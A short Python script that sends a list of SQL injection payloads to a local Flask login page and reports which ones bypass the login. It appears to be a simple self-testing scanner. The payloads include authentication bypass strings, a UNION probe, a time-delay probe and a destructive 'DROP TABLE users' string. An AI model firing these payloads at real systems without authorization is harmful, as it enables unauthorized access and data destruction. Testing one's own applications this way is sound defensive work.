#!/usr/bin/env python3

import requests
import os

URL = "http://127.0.0.1:5000/login"  # Local Flask login page

payloads = [
    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
    "' OR ''='", "' AND 1=1--", "'; DROP TABLE users;--",
    "' or sleep(5)#", "';--", "' or 1=1 limit 1--"
]

def check_connectivity():
    try:
        requests.get(URL)
    except Exception as e:
        print(f"❌ Cannot connect to {URL}. Error: {e}")
        exit(1)

def scan_sql_injection():
    os.system("clear")
    print("🛡️ Starting SQLi Scan on:", URL)
    for p in payloads:
        data = {'username': p, 'password': 'test'}
        r = requests.post(URL, data=data)
        if "Welcome" in r.text or r.status_code == 302:
            print(f"🚨 Vulnerable to payload: {p}")
        else:
            print(f"✅ Protected against: {p}")

if __name__ == "__main__":
    check_connectivity()
    scan_sql_injection()
